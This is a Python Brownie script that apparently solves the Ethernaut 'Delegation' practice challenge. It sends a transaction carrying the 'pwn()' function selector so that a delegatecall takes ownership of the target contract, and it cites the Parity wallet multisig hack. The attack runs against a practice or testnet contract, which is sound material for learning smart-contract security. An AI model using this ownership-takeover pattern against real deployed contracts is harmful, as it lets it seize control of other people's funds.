"""
Refers to hack of The Parity Wallet, see: https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/
"""
from brownie import Delegate, Delegation, interface, network, config
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account

if network.show_active() == "rinkeby": from web3.auto.infura.rinkeby import w3 
else: from web3.auto import w3

from web3 import Web3


def initial_setup(contract_to_deploy, interface_of_contract_to_deploye, deployed_instance_address=None):

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        deploying_account = get_account(1)
        print("Depyloing address: {}".format(deploying_account))
        deployed_contract = contract_to_deploy.deploy(deploying_account.address, {"from": deploying_account})
    else:
        deployed_contract_address = config["networks"][network.show_active()][deployed_instance_address]
        deployed_contract = interface_of_contract_to_deploye(deployed_contract_address)
    
    return deployed_contract


def deploy_attack_on_delegate_contract(attack_contract_to_deploy, target_contract_deployed):
    # set deploying accoutn
    deploying_account = get_account()
    # deploy attack contract
    attack_contract = attack_contract_to_deploy.deploy(target_contract_deployed.address, {"from": deploying_account})
    # get method ID
    data_to_send = Web3.keccak(text="pwn()")[0:4].hex()
    print("Method ID: {}".format(data_to_send))
    # perform delegate call
    deploying_account.transfer(target_contract_deployed.address, data=data_to_send)
    
    return attack_contract


def claim_ownership_of_delegate_contract():
    # get delegate contract
    delegate_contract = initial_setup(Delegate, interface.IDelegate, "delegation_instance")
    # deploy attack
    deploy_attack_on_delegate_contract(Delegation, delegate_contract)


def main():
    claim_ownership_of_delegate_contract()

